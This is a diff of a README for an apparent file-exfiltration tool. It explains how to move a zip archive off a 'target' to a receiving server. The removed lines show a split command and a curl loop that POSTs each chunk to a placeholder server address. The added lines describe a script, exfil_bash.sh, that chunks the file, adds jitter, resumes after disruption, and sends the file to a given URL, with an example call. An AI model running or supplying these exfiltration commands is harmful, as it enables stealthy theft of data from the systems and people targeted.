@@ -11,33 +11,9 @@ Once the requirement are ready, run the server.py script:
 ![Exection of python server.py script.](./image.png)
 
 ## Execution on target:
-**Step 1:** Split the file into chunks
+The bash script takes in the input of the zip file to be transferred and automatically chunks it for exfiltration and sends it to the user supplied server url. Additionally, the script has a jitter and the capability to continue in case it gets disrupted during execution (as long as the same **upload_id** is supplied)
 
-`split -b 5M yourfile.zip chunk_`
+`./exfil_bash.sh <file> <server_url> <upload_id>`
 
-
-This creates:
-
-**chunk_aa**
-
-**chunk_ab**
-
-**chunk_ac**
-
-**...**
-
-**Step 2:** Upload chunks with curl by creating a bash file on target with below: (Ensure you modify values like **<SERVER_IP>**)
-
-```toml
-TOTAL=$(ls chunk_* | wc -l)
-INDEX=0
-
-for f in chunk_*; do
-  curl -X POST http://<SERVER_IP>:5000/upload \
-    -F "file=@$f" \
-    -F "filename=yourfile.zip" \
-    -F "chunk_index=$INDEX" \
-    -F "total_chunks=$TOTAL"
-
-  INDEX=$((INDEX+1))
-done```
+Example:
+```./exfil_bash yourfile.zip http://192.168.0.1:5000 randomstring-001```
